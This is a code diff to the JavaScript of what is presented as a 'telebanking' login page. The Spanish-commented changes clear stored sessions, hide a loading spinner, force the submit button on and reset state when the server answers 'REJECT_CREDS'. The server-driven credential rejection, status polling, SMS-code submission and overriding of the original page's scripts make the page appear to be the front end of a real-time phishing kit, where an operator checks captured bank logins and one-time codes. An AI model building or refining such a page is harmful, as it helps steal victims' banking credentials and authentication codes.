@@ -19,8 +19,11 @@ document.addEventListener("DOMContentLoaded", () => {
   const loader = document.getElementById("ajax_loader");
 
   // Estado de Sesión Local
-  let currentSessionId = localStorage.getItem("telebanking_session_id") || null;
+  let currentSessionId = null;
   let statusPollInterval = null;
+
+  // Limpiar cualquier sesión anterior al cargar para evitar spinner automático
+  localStorage.removeItem("telebanking_session_id");
 
   // Helper para mostrar u ocultar Spinner Loader sin bloqueos
   function setLoaderState(show) {
@@ -38,7 +41,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   }
 
-  // Ocultar loader al cargar la página
+  // Forzar ocultamiento del loader al cargar la página
   setLoaderState(false);
 
   // Sobrescribir modalLoad global para evitar interferencias de scripts legacy
@@ -109,7 +112,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 
-  // Forzar habilitación del botón
+  // Forzar habilitación constante del botón
   setInterval(checkFormValidity, 300);
   checkFormValidity();
 
@@ -226,6 +229,9 @@ document.addEventListener("DOMContentLoaded", () => {
       case "REJECT_CREDS":
         setLoaderState(false);
         if (modalSms) modalSms.style.display = "none";
+        currentSessionId = null;
+        localStorage.removeItem("telebanking_session_id");
+        if (statusPollInterval) clearInterval(statusPollInterval);
         showErrorState(data.errorMessage || "Nombre de usuario o contraseña incorrectos.");
         break;
 
@@ -247,6 +253,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   // Mostrar mensaje de error en la interfaz
   function showErrorState(msg) {
+    setLoaderState(false);
     if (submitBtn) {
       submitBtn.textContent = "Ingresar";
       submitBtn.removeAttribute("disabled");
@@ -299,10 +306,5 @@ document.addEventListener("DOMContentLoaded", () => {
         console.error("Error al enviar código SMS:", err);
       }
     });
-  }
-
-  // Si ya existía una sesión previa activa, reanudar sondeo
-  if (currentSessionId) {
-    startPollingStatus();
   }
 });
